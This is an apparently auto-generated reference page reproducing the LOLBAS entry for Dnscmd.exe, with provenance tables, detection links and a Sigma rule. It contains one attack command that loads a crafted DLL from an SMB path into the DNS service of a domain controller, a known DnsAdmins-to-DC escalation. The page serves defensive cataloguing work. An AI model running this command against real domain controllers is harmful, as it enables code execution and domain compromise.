---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Dnscmd.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `dnscmd.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dnscmd.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Dnscmd.exe](../../tools/windows/dnscmd.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | dnscmd.exe |
| name | Dnscmd.exe |
| type | tool |
| source | lolbas |
| url | http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html |

## Preserved Source Material

```yaml
Acknowledgement:
- Person: Shay Ber
- Handle: '@dim0x69'
  Person: Dimitrios Slamaris
- Handle: '@nikhil_mitt'
  Person: Nikhil SamratAshok
Author: Oddvar Moe
Commands:
- Category: Execute
  Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
  Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that
    is at least a member of the DnsAdmins group. See the reference links for DLL details.
  MitreID: T1543.003
  OperatingSystem: Windows server
  Privileges: DNS admin
  Tags:
  - Execute: DLL
  - Execute: Remote
  Usecase: Remotely inject dll to dns server
Created: 2018-05-25
Description: A command-line interface for managing DNS servers
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
- IOC: Dnscmd.exe loading dll from UNC/arbitrary path
Full_Path:
- Path: C:\Windows\System32\Dnscmd.exe
- Path: C:\Windows\SysWOW64\Dnscmd.exe
Name: Dnscmd.exe
Resources:
- Link: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
- Link: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
- Link: https://github.com/dim0x69/dns-exe-persistance/tree/master/dns-plugindll-vcpp
- Link: https://twitter.com/Hexacorn/status/994000792628719618
- Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Dnscmd.yml
```

## Detection / Analysis Notes

```text
IOC: Dnscmd.exe loading dll from UNC/arbitrary path
```

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
- IOC: Dnscmd.exe loading dll from UNC/arbitrary path
```
